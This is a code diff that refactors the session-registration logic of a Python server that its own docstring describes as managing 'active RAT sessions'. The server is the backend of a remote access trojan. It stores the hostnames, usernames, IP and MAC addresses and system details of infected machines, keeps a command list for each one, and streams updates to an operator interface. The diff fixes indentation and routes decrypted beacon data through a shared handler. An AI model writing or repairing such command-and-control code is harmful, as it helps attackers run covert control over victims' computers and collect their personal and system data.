@@ -152,115 +152,19 @@ def generate_key():
 
 class SessionManager:
     """Manage active RAT sessions"""
+    
     @staticmethod
-def register_plain_session(session_id, info):
-    """Register a session using plain info (no decryption needed)."""
-    try:
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
-        now = datetime.datetime.now()
-
-        # Check if session exists
-        cursor.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
-        existing = cursor.fetchone()
-
-        if existing:
-            # Update existing session
-            cursor.execute('''
-                UPDATE sessions SET 
-                    last_seen = ?,
-                    status = ?,
-                    ip_address = ?,
-                    public_ip = ?
-                WHERE session_id = ?
-            ''', (now, "active", 
-                  info.get("ip_addresses", [""])[0] if info.get("ip_addresses") else "",
-                  info.get("public_ip", ""),
-                  session_id))
-        else:
-            # Insert new session
-            cursor.execute('''
-                INSERT INTO sessions 
-                (id, session_id, hostname, username, platform, system, 
-                 ip_address, public_ip, mac_address, first_seen, last_seen, status)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-            ''', (
-                str(uuid.uuid4()),
-                session_id,
-                info.get("hostname", "Unknown"),
-                info.get("username", "Unknown"),
-                info.get("platform", "Unknown"),
-                info.get("system", "Unknown"),
-                info.get("ip_addresses", [""])[0] if info.get("ip_addresses") else "",
-                info.get("public_ip", "Unknown"),
-                info.get("mac_address", "Unknown"),
-                now,
-                now,
-                "active"
-            ))
-
-            # Also insert system info if present
-            cursor.execute('''
-                INSERT INTO system_info
-                (id, session_id, cpu_count, memory_total, disk_usage, 
-                 processes, boot_time, timezone, timestamp)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-            ''', (
-                str(uuid.uuid4()),
-                session_id,
-                info.get("cpu_count", 0),
-                info.get("memory_total", 0),
-                json.dumps(info.get("disk_usage", {})),
-                info.get("processes", 0),
-                info.get("boot_time", 0),
-                json.dumps(info.get("timezone", [])),
-                now
-            ))
-
-        conn.commit()
-        conn.close()
-
-        # Update in‑memory session cache
-        SESSIONS[session_id] = {
-            "info": info,
-            "last_seen": now,
-            "status": "active",
-            "commands": []
-        }
-
-        # Emit WebSocket event
-        socketio.emit('session_update', {
-            'session_id': session_id,
-            'hostname': info.get("hostname"),
-            'username': info.get("username"),
-            'ip': info.get("public_ip"),
-            'status': 'active',
-            'last_seen': now.isoformat()
-        })
-
-        LOGGER.info(f"Session registered (plain): {session_id} from {info.get('public_ip')}")
-        return {"status": "success", "session_id": session_id}
-
-    except Exception as e:
-        LOGGER.error(f"Plain session registration error: {e}")
-        return {"status": "error", "message": str(e)}
-    @staticmethod
-    def register_session(session_data):
-        """Register a new session or update existing"""
+    def register_plain_session(session_id, info):
+        """Register a session using plain info (no decryption needed)."""
         try:
-            session_id = session_data.get("session_id")
-            decrypted = decrypt_data(session_data.get("data"))
-            info = json.loads(decrypted)
-            
             conn = sqlite3.connect(DATABASE)
             cursor = conn.cursor()
-            
+            now = datetime.datetime.now()
+
             # Check if session exists
             cursor.execute("SELECT * FROM sessions WHERE session_id = ?", (session_id,))
             existing = cursor.fetchone()
-            
-            now = datetime.datetime.now()
-            
+
             if existing:
                 # Update existing session
                 cursor.execute('''
@@ -270,8 +174,10 @@ def register_plain_session(session_id, info):
                         ip_address = ?,
                         public_ip = ?
                     WHERE session_id = ?
-                ''', (now, "active", info.get("ip_addresses", [""])[0], 
-                      info.get("public_ip", ""), session_id))
+                ''', (now, "active", 
+                      info.get("ip_addresses", [""])[0] if info.get("ip_addresses") else "",
+                      info.get("public_ip", ""),
+                      session_id))
             else:
                 # Insert new session
                 cursor.execute('''
@@ -286,15 +192,15 @@ def register_plain_session(session_id, info):
                     info.get("username", "Unknown"),
                     info.get("platform", "Unknown"),
                     info.get("system", "Unknown"),
-                    info.get("ip_addresses", [""])[0],
+                    info.get("ip_addresses", [""])[0] if info.get("ip_addresses") else "",
                     info.get("public_ip", "Unknown"),
                     info.get("mac_address", "Unknown"),
                     now,
                     now,
                     "active"
                 ))
-                
-                # Store system info
+
+                # Also insert system info if present
                 cursor.execute('''
                     INSERT INTO system_info
                     (id, session_id, cpu_count, memory_total, disk_usage, 
@@ -311,19 +217,19 @@ def register_plain_session(session_id, info):
                     json.dumps(info.get("timezone", [])),
                     now
                 ))
-            
+
             conn.commit()
             conn.close()
-            
-            # Update in-memory sessions
+
+            # Update in‑memory session cache
             SESSIONS[session_id] = {
                 "info": info,
                 "last_seen": now,
                 "status": "active",
                 "commands": []
             }
-            
-            # Emit socketio event for new session
+
+            # Emit WebSocket event
             socketio.emit('session_update', {
                 'session_id': session_id,
                 'hostname': info.get("hostname"),
@@ -332,13 +238,28 @@ def register_plain_session(session_id, info):
                 'status': 'active',
                 'last_seen': now.isoformat()
             })
-            
-            LOGGER.info(f"Session registered: {session_id} from {info.get('public_ip')}")
-            
+
+            LOGGER.info(f"Session registered (plain): {session_id} from {info.get('public_ip')}")
             return {"status": "success", "session_id": session_id}
+
+        except Exception as e:
+            LOGGER.error(f"Plain session registration error: {e}")
+            return {"status": "error", "message": str(e)}
+
+    @staticmethod
+    def register_session(session_data):
+        """Register a session with encrypted data"""
+        try:
+            session_id = session_data.get("session_id")
+            # Note: decrypt_data must be defined in your global scope
+            decrypted = decrypt_data(session_data.get("data"))
+            info = json.loads(decrypted)
+            
+            # Delegate to the plain registration logic
+            return SessionManager.register_plain_session(session_id, info)
             
         except Exception as e:
-            LOGGER.error(f"Session registration error: {e}")
+            LOGGER.error(f"Encrypted session registration error: {e}")
             return {"status": "error", "message": str(e)}
     
     @staticmethod
